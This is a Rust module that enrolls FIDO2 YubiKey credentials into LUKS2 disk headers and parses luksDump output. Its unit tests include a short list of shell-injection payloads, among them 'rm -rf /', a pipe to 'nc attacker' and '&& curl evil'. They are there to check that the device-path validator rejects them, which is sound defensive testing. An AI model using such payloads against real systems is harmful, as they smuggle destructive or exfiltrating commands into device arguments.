// file: crates/uaa-core/src/luks_keys.rs
// version: 1.1.2
// guid: 2aa8e08c-f451-4463-962a-5fa2d970dd7a
// last-edited: 2026-07-10

//! LUKS key management — `uaa luks` enroll + status core (LK-01/LK-02 stub
//! filled by luks-keys/TASK-01). Manages LUKS2 keyslots via FIDO2 YubiKeys
//! ONLY — this module never authenticates a user or a service (spec Decision
//! 14). Continued by luks-keys/TASK-02 (revoke) and TASK-03 (`luks_sync.rs`,
//! which reads the state file this module writes).
//!
//! Credential model (PLAN-zfs-luks-multikey.md "YubiKey topology"): each
//! host's LUKS header enrolls exactly three FIDO2 credentials — `primary`
//! (stays plugged in), `backup1` (locked up), `backup2` (owner's keychain).
//! FIDO2 non-resident credentials live in the disk's LUKS2 header, so one
//! physical key enrolls on unlimited machines.

use crate::error::AutoInstallError;

// ── Credential role ──────────────────────────────────────────────────────────

/// Which of the 3 per-host FIDO2 credentials a keyslot belongs to
/// (PLAN-zfs-luks-multikey.md 3-credential model). LUKS disk unlock
/// ONLY — never used for auth.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CredentialRole {
    Primary,
    Backup1,
    Backup2,
}

impl std::str::FromStr for CredentialRole {
    type Err = AutoInstallError;

    fn from_str(s: &str) -> std::result::Result<Self, Self::Err> {
        match s {
            "primary" => Ok(CredentialRole::Primary),
            "backup1" => Ok(CredentialRole::Backup1),
            "backup2" => Ok(CredentialRole::Backup2),
            other => Err(AutoInstallError::ConfigError(format!(
                "unknown LUKS credential role '{other}'; expected one of: primary, backup1, backup2"
            ))),
        }
    }
}

// ── Command builder (enroll) ─────────────────────────────────────────────────

/// Fail-closed guard shared by every entry point in this module: `luks_dev`
/// is read from the live target at runtime and must never be guessed.
fn validate_luks_dev(luks_dev: &str) -> crate::error::Result<()> {
    if !luks_dev.starts_with("/dev/") {
        return Err(AutoInstallError::ConfigError(format!(
            "luks_dev must be an absolute /dev/ path, got '{luks_dev}'"
        )));
    }
    // Fail-closed against shell injection: `luks_dev` is interpolated UNQUOTED
    // into shell command strings (dump_command / build_enroll_command), so it
    // must contain only device-path characters. Reject anything with a space or
    // a shell metacharacter (`;`, `|`, `&`, `$`, backtick, `()`, `<>`, quotes,
    // `*?[]{}`, newline, …) rather than trying to escape it — a real device
    // path never needs them. Covers /dev/nvme0n1p4, /dev/sda1, /dev/vda,
    // /dev/mapper/luks-<uuid>, /dev/disk/by-id/… .
    if !luks_dev
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'_' | b'-' | b'.'))
    {
        return Err(AutoInstallError::ConfigError(format!(
            "luks_dev contains characters not allowed in a device path (possible injection): '{luks_dev}'"
        )));
    }
    Ok(())
}

/// The `cryptsetup luksDump` command run for both the before/after enroll
/// snapshots and for `luks_status`.
fn dump_command(luks_dev: &str) -> String {
    format!("sudo -n cryptsetup luksDump {luks_dev}")
}

/// Full command executed via the CommandExecutor. NEVER log this string —
/// it embeds the existing LUKS passphrase. Log redacted_enroll_command().
///
/// The passphrase travels as a `PASSWORD=...` env-var prefix consumed by
/// `systemd-cryptenroll` (same convention as the first-boot TPM2 unit — see
/// `src/network/ssh_installer/system_setup.rs`) — NEVER as a `-P`-style argv
/// token, so it never shows up in the server's `ps` output.
pub fn build_enroll_command(luks_dev: &str, passphrase: &str) -> crate::error::Result<String> {
    validate_luks_dev(luks_dev)?;
    if passphrase.is_empty() {
        return Err(AutoInstallError::ConfigError(
            "LUKS passphrase must not be empty".to_string(),
        ));
    }
    if passphrase.contains('\'') {
        // Fail-closed: reject rather than escape — no shell-injection surface.
        return Err(AutoInstallError::ConfigError(
            "LUKS passphrase must not contain a single-quote character".to_string(),
        ));
    }
    Ok(format!(
        "PASSWORD='{passphrase}' systemd-cryptenroll --fido2-device=auto --fido2-with-client-pin=yes {luks_dev}"
    ))
}

/// Passphrase-free form, safe for logs and errors.
pub fn redacted_enroll_command(luks_dev: &str) -> String {
    format!("systemd-cryptenroll --fido2-device=auto --fido2-with-client-pin=yes {luks_dev}")
}

// ── luksDump token parser + status ───────────────────────────────────────────

/// One `systemd-fido2` token block parsed out of `cryptsetup luksDump` output.
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct Fido2Token {
    pub token_id: u32,
    pub keyslot: Option<u32>,
}

/// Parse every `systemd-fido2` token block out of `cryptsetup luksDump`
/// output. Zero fido2 tokens => `vec![]` — NOT an error. A fido2 block with a
/// missing/garbled `Keyslot:` line => `keyslot: None` — NOT a parse abort.
/// Tolerates arbitrary indentation and extra fields inside a token block.
pub fn parse_fido2_tokens(luksdump_output: &str) -> Vec<Fido2Token> {
    let mut tokens = Vec::new();
    let mut current: Option<Fido2Token> = None;

    for raw_line in luksdump_output.lines() {
        let line = raw_line.trim();

        // Token header lines look like "2: systemd-fido2" or "0: clevis" —
        // the part before the colon parses as a plain integer. Field lines
        // inside a block (e.g. "Keyslot:    3", "fido2-credential: ...")
        // never do, so this cleanly disambiguates the two.
        if let Some((left, right)) = line.split_once(':') {
            if let Ok(id) = left.trim().parse::<u32>() {
                if let Some(tok) = current.take() {
                    tokens.push(tok);
                }
                if right.trim() == "systemd-fido2" {
                    current = Some(Fido2Token {
                        token_id: id,
                        keyslot: None,
                    });
                }
                continue;
            }
        }

        if line == "Keyslots:" {
            // End of the Tokens: section — nothing after this belongs to a
            // token block.
            if let Some(tok) = current.take() {
                tokens.push(tok);
            }
            continue;
        }

        if let Some(cur) = current.as_mut() {
            if let Some(rest) = line.strip_prefix("Keyslot:") {
                cur.keyslot = rest.trim().parse::<u32>().ok();
            }
        }
    }

    if let Some(tok) = current.take() {
        tokens.push(tok);
    }

    tokens
}

/// Run `sudo -n cryptsetup luksDump <luks_dev>` through the executor and
/// return (CheckResult from evaluate_fido2_keyslot, parsed tokens).
pub async fn luks_status(
    executor: &mut dyn crate::network::CommandExecutor,
    luks_dev: &str,
) -> crate::error::Result<(crate::autoinstall::verify::CheckResult, Vec<Fido2Token>)> {
    validate_luks_dev(luks_dev)?;
    let output = executor.execute_with_output(&dump_command(luks_dev)).await?;
    let check = crate::autoinstall::verify::evaluate_fido2_keyslot(&output);
    let tokens = parse_fido2_tokens(&output);
    Ok((check, tokens))
}

// ── Enroll driver + local state record (LK-03 contract) ─────────────────────

/// One enrolled FIDO2 credential, recorded locally so LK-03 can sync it.
/// Field names/shapes are a cross-task contract with `luks_sync.rs` — do not
/// rename.
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct LuksCredentialRecord {
    pub yubikey_serial: String,
    pub role: CredentialRole,
    pub luks_keyslot: Option<u32>,
    /// RFC3339 via `chrono::Utc::now().to_rfc3339()`.
    pub enrolled_at: String,
    /// Set by LK-02's revoke, never here.
    pub revoked_at: Option<String>,
}

/// Read the JSON array of [`LuksCredentialRecord`]s at `state_path` (missing
/// or empty file => `vec![]`), append `record`, then write it back
/// atomically: serialize to `<state_path>.tmp`, then `std::fs::rename` over
/// the target. Never truncate-then-write in place.
fn append_state(state_path: &std::path::Path, record: LuksCredentialRecord) -> crate::error::Result<()> {
    let mut records: Vec<LuksCredentialRecord> = if state_path.exists() {
        let contents = std::fs::read_to_string(state_path)?;
        if contents.trim().is_empty() {
            Vec::new()
        } else {
            serde_json::from_str(&contents)?
        }
    } else {
        Vec::new()
    };
    records.push(record);

    let json = serde_json::to_string_pretty(&records)?;
    let mut tmp_name = state_path.as_os_str().to_owned();
    tmp_name.push(".tmp");
    let tmp_path = std::path::PathBuf::from(tmp_name);
    std::fs::write(&tmp_path, json)?;
    std::fs::rename(&tmp_path, state_path)?;
    Ok(())
}

/// Enroll a new FIDO2 credential into `luks_dev` for `role`, driven by the
/// `yubikey_serial` physical key currently plugged in, and record the result
/// at `state_path` (the CLI's default: `/var/lib/uaa/luks-credentials.json`).
///
/// Every failure is fail-closed — `Err` BEFORE the cryptenroll call where
/// possible; the executor sees zero commands on any validation failure.
pub async fn enroll_fido2(
    executor: &mut dyn crate::network::CommandExecutor,
    luks_dev: &str,
    role: CredentialRole,
    yubikey_serial: &str,
    passphrase: &str,
    state_path: &std::path::Path,
) -> crate::error::Result<LuksCredentialRecord> {
    // 1. Validate everything BEFORE touching the executor.
    validate_luks_dev(luks_dev)?;
    if yubikey_serial.is_empty() {
        return Err(AutoInstallError::ConfigError(
            "YubiKey serial must not be empty".to_string(),
        ));
    }
    let enroll_cmd = build_enroll_command(luks_dev, passphrase)?;

    let dump_cmd = dump_command(luks_dev);

    // 2. Snapshot BEFORE.
    let before_output = executor.execute_with_output(&dump_cmd).await?;
    let before_ids: std::collections::HashSet<u32> = parse_fido2_tokens(&before_output)
        .into_iter()
        .map(|t| t.token_id)
        .collect();

    // 3. Run the built enroll command. Log ONLY the redacted twin — the
    // built command embeds the passphrase and must never be logged.
    tracing::info!(
        "luks: enrolling FIDO2 credential ({role:?}) on {luks_dev}: {}",
        redacted_enroll_command(luks_dev)
    );
    executor.execute_with_output(&enroll_cmd).await?;

    // 4. Snapshot AFTER — exactly one new systemd-fido2 token must appear.
    let after_output = executor.execute_with_output(&dump_cmd).await?;
    let after_tokens = parse_fido2_tokens(&after_output);
    let new_tokens: Vec<&Fido2Token> = after_tokens
        .iter()
        .filter(|t| !before_ids.contains(&t.token_id))
        .collect();

    let new_token = match new_tokens.as_slice() {
        [] => {
            return Err(AutoInstallError::SystemError(
                "enrollment ran but no new systemd-fido2 token appeared".to_string(),
            ));
        }
        [only] => *only,
        _ => {
            return Err(AutoInstallError::SystemError(format!(
                "enrollment ran but {} new systemd-fido2 tokens appeared (expected exactly 1)",
                new_tokens.len()
            )));
        }
    };

    let record = LuksCredentialRecord {
        yubikey_serial: yubikey_serial.to_string(),
        role,
        luks_keyslot: new_token.keyslot,
        enrolled_at: chrono::Utc::now().to_rfc3339(),
        revoked_at: None,
    };

    // 5. Append to local state, atomically.
    append_state(state_path, record.clone())?;

    Ok(record)
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::network::CommandExecutor;
    use async_trait::async_trait;
    use std::collections::{HashMap, VecDeque};

    const DEV: &str = "/dev/nvme0n1p4";

    /// Mock executor with queued outputs per command — supports the SAME
    /// command (e.g. the before/after luksDump) being run twice with
    /// different responses — PLUS a `Vec<String>` of every command actually
    /// executed so fail-closed (zero-command) assertions work.
    #[derive(Default)]
    struct MockExecutor {
        responses: HashMap<String, VecDeque<String>>,
        recorded: Vec<String>,
    }

    impl MockExecutor {
        fn new() -> Self {
            Self::default()
        }

        fn queue(mut self, cmd: &str, output: &str) -> Self {
            self.responses
                .entry(cmd.to_string())
                .or_default()
                .push_back(output.to_string());
            self
        }
    }

    #[async_trait]
    impl CommandExecutor for MockExecutor {
        async fn connect(&mut self, _host: &str, _username: &str) -> crate::error::Result<()> {
            Ok(())
        }
        async fn execute(&mut self, command: &str) -> crate::error::Result<()> {
            self.recorded.push(command.to_string());
            Ok(())
        }
        async fn execute_with_output(&mut self, command: &str) -> crate::error::Result<String> {
            self.recorded.push(command.to_string());
            Ok(self
                .responses
                .get_mut(command)
                .and_then(|q| q.pop_front())
                .unwrap_or_default())
        }
        async fn execute_with_error_collection(
            &mut self,
            command: &str,
            _description: &str,
        ) -> crate::error::Result<(i32, String, String)> {
            self.recorded.push(command.to_string());
            Ok((0, String::new(), String::new()))
        }
        async fn check_silent(&mut self, command: &str) -> crate::error::Result<bool> {
            self.recorded.push(command.to_string());
            Ok(false)
        }
        async fn collect_debug_info(&mut self) -> crate::error::Result<String> {
            Ok(String::new())
        }
        async fn upload_file(&mut self, _local: &str, _remote: &str) -> crate::error::Result<()> {
            Ok(())
        }
        async fn download_file(&mut self, _remote: &str, _local: &str) -> crate::error::Result<()> {
            Ok(())
        }
        fn disconnect(&mut self) {}
    }

    // ── Role parsing ──────────────────────────────────────────────────────

    #[test]
    fn test_role_parse() {
        assert_eq!("primary".parse::<CredentialRole>().unwrap(), CredentialRole::Primary);
        assert_eq!("backup1".parse::<CredentialRole>().unwrap(), CredentialRole::Backup1);
        assert_eq!("backup2".parse::<CredentialRole>().unwrap(), CredentialRole::Backup2);

        let err = "backup3".parse::<CredentialRole>().unwrap_err();
        assert!(matches!(err, AutoInstallError::ConfigError(_)));
        let msg = err.to_string();
        assert!(msg.contains("primary"));
        assert!(msg.contains("backup1"));
        assert!(msg.contains("backup2"));
    }

    // ── Command builder ──────────────────────────────────────────────────

    #[test]
    fn test_build_enroll_command_shape() {
        let cmd = build_enroll_command(DEV, "test-passphrase").expect("valid inputs should build");
        assert!(cmd.contains("systemd-cryptenroll --fido2-device=auto --fido2-with-client-pin=yes /dev/nvme0n1p4"));
        assert!(cmd.starts_with("PASSWORD="));
    }

    #[test]
    fn test_build_enroll_command_rejects() {
        assert!(matches!(
            build_enroll_command(DEV, ""),
            Err(AutoInstallError::ConfigError(_))
        ));
        assert!(matches!(
            build_enroll_command(DEV, "a'b"),
            Err(AutoInstallError::ConfigError(_))
        ));
        assert!(matches!(
            build_enroll_command("nvme0n1p4", "test-passphrase"),
            Err(AutoInstallError::ConfigError(_))
        ));
    }

    #[test]
    fn test_validate_luks_dev_rejects_injection() {
        // Shell-metacharacter payloads that pass the /dev/ prefix but must be
        // rejected before ever reaching a command string.
        for evil in [
            "/dev/sda; rm -rf /",
            "/dev/$(whoami)",
            "/dev/`id`",
            "/dev/sda|nc attacker 1",
            "/dev/sda && curl evil",
            "/dev/sd a",
            "/dev/sda\nrm -rf /",
            "/dev/sda>~/x",
        ] {
            assert!(
                matches!(build_enroll_command(evil, "pw"), Err(AutoInstallError::ConfigError(_))),
                "injection payload should be rejected: {evil:?}"
            );
        }
    }

    #[test]
    fn test_validate_luks_dev_accepts_real_paths() {
        // Anti-over-suppression: legitimate device paths must still build.
        for good in [
            "/dev/nvme0n1p4",
            "/dev/sda1",
            "/dev/vda",
            "/dev/mapper/luks-0f3c2a1b-dead-beef",
            "/dev/disk/by-id/nvme-eui.0025",
        ] {
            assert!(
                build_enroll_command(good, "pw").is_ok(),
                "legitimate device path should build: {good:?}"
            );
        }
    }

    #[test]
    fn test_redacted_omits_passphrase() {
        let redacted = redacted_enroll_command(DEV);
        assert!(!redacted.contains("test-passphrase"));
        assert!(!redacted.contains("PASSWORD"));
        assert!(redacted.contains("--fido2-device=auto --fido2-with-client-pin=yes"));
        assert!(redacted.contains(DEV));
    }

    // ── luksDump token parser ────────────────────────────────────────────

    const LUKSDUMP_MULTI: &str = "\
LUKS header information
Version:        2
Tokens:
  0: clevis
        Keyslot:    1
  1: systemd-fido2
        fido2-credential: aaaabbbb
        Keyslot:    2
  3: systemd-fido2
        fido2-credential: ccccdddd
        Keyslot:    4
Keyslots:
  1: luks2
  2: luks2
  4: luks2
";

    const LUKSDUMP_EMPTY: &str = "\
LUKS header information
Version:        2
Tokens:
  0: clevis
        Keyslot:    1
Keyslots:
  1: luks2
";

    const LUKSDUMP_MISSING_KEYSLOT: &str = "\
LUKS header information
Version:        2
Tokens:
  2: systemd-fido2
        fido2-credential: eeeeffff
Keyslots:
  0: luks2
";

    #[test]
    fn test_parse_fido2_tokens_multi() {
        let tokens = parse_fido2_tokens(LUKSDUMP_MULTI);
        assert_eq!(
            tokens,
            vec![
                Fido2Token { token_id: 1, keyslot: Some(2) },
                Fido2Token { token_id: 3, keyslot: Some(4) },
            ]
        );
    }

    #[test]
    fn test_parse_fido2_tokens_empty() {
        assert_eq!(parse_fido2_tokens(LUKSDUMP_EMPTY), vec![]);
    }

    #[test]
    fn test_parse_fido2_tokens_missing_keyslot() {
        let tokens = parse_fido2_tokens(LUKSDUMP_MISSING_KEYSLOT);
        assert_eq!(tokens, vec![Fido2Token { token_id: 2, keyslot: None }]);
    }

    // ── luks_status ───────────────────────────────────────────────────────

    #[tokio::test]
    async fn test_luks_status_reports_tokens() {
        let mut mock = MockExecutor::new().queue(&dump_command(DEV), LUKSDUMP_MULTI);
        let (check, tokens) = luks_status(&mut mock, DEV).await.expect("status should succeed");
        assert!(check.passed);
        assert_eq!(tokens.len(), 2);
    }

    #[tokio::test]
    async fn test_luks_status_rejects_bad_dev() {
        let mut mock = MockExecutor::new();
        let err = luks_status(&mut mock, "nvme0n1p4").await.unwrap_err();
        assert!(matches!(err, AutoInstallError::ConfigError(_)));
        assert_eq!(mock.recorded.len(), 0);
    }

    // ── enroll_fido2 ──────────────────────────────────────────────────────

    #[tokio::test]
    async fn test_enroll_validation_no_command() {
        let dir = tempfile::tempdir().expect("tempdir");
        let state_path = dir.path().join("luks-credentials.json");

        // Bad dev.
        let mut mock = MockExecutor::new();
        let err = enroll_fido2(
            &mut mock,
            "nvme0n1p4",
            CredentialRole::Primary,
            "12345678",
            "test-passphrase",
            &state_path,
        )
        .await
        .unwrap_err();
        assert!(matches!(err, AutoInstallError::ConfigError(_)));
        assert_eq!(mock.recorded.len(), 0);

        // Empty serial.
        let mut mock = MockExecutor::new();
        let err = enroll_fido2(&mut mock, DEV, CredentialRole::Primary, "", "test-passphrase", &state_path)
            .await
            .unwrap_err();
        assert!(matches!(err, AutoInstallError::ConfigError(_)));
        assert_eq!(mock.recorded.len(), 0);

        // Passphrase with a quote.
        let mut mock = MockExecutor::new();
        let err = enroll_fido2(&mut mock, DEV, CredentialRole::Primary, "12345678", "a'b", &state_path)
            .await
            .unwrap_err();
        assert!(matches!(err, AutoInstallError::ConfigError(_)));
        assert_eq!(mock.recorded.len(), 0);

        assert!(!state_path.exists());
    }

    #[tokio::test]
    async fn test_enroll_no_new_token_errors() {
        let dir = tempfile::tempdir().expect("tempdir");
        let state_path = dir.path().join("luks-credentials.json");

        let dump_cmd = dump_command(DEV);
        let mut mock = MockExecutor::new()
            .queue(&dump_cmd, LUKSDUMP_MISSING_KEYSLOT)
            .queue(&dump_command(DEV), LUKSDUMP_MISSING_KEYSLOT);

        let err = enroll_fido2(
            &mut mock,
            DEV,
            CredentialRole::Primary,
            "12345678",
            "test-passphrase",
            &state_path,
        )
        .await
        .unwrap_err();
        assert!(matches!(err, AutoInstallError::SystemError(_)));
        assert!(err.to_string().contains("no new systemd-fido2 token"));
        assert!(!state_path.exists());
    }

    #[tokio::test]
    async fn test_enroll_happy_path_appends_state() {
        let dir = tempfile::tempdir().expect("tempdir");
        let state_path = dir.path().join("luks-credentials.json");

        const BEFORE: &str = "\
Tokens:
  1: systemd-fido2
        Keyslot:    2
Keyslots:
  2: luks2
";
        const AFTER: &str = "\
Tokens:
  1: systemd-fido2
        Keyslot:    2
  3: systemd-fido2
        Keyslot:    5
Keyslots:
  2: luks2
  5: luks2
";

        let dump_cmd = dump_command(DEV);
        let mut mock = MockExecutor::new()
            .queue(&dump_cmd, BEFORE)
            .queue(&dump_cmd, AFTER);

        let record = enroll_fido2(
            &mut mock,
            DEV,
            CredentialRole::Primary,
            "12345678",
            "test-passphrase",
            &state_path,
        )
        .await
        .expect("enroll should succeed");

        assert_eq!(record.luks_keyslot, Some(5));
        assert_eq!(record.role, CredentialRole::Primary);
        assert_eq!(record.revoked_at, None);

        // Recorded commands: before-dump, enroll, after-dump — the guard
        // stack must not have blocked or altered the legitimate enroll call.
        assert_eq!(mock.recorded.len(), 3);
        assert_eq!(mock.recorded[0], dump_cmd);
        assert_eq!(
            mock.recorded[1],
            build_enroll_command(DEV, "test-passphrase").unwrap()
        );
        assert_eq!(mock.recorded[2], dump_cmd);

        let contents = std::fs::read_to_string(&state_path).expect("state file written");
        let records: Vec<LuksCredentialRecord> = serde_json::from_str(&contents).expect("valid json");
        assert_eq!(records.len(), 1);
        assert_eq!(records[0].role, CredentialRole::Primary);
        assert_eq!(records[0].revoked_at, None);
        assert_eq!(records[0].luks_keyslot, Some(5));

        // LK-03 reads this file directly, so the ON-DISK wire encoding is the
        // actual contract — assert it as raw JSON rather than round-tripping
        // through the same serde derives that wrote it (which would stay
        // green even if the encoding drifted, e.g. losing
        // `rename_all = "lowercase"` or gaining `skip_serializing_if`).
        let raw: serde_json::Value = serde_json::from_str(&contents).expect("valid json");
        assert_eq!(raw[0]["role"], "primary");
        assert!(raw[0]["revoked_at"].is_null());
    }
}
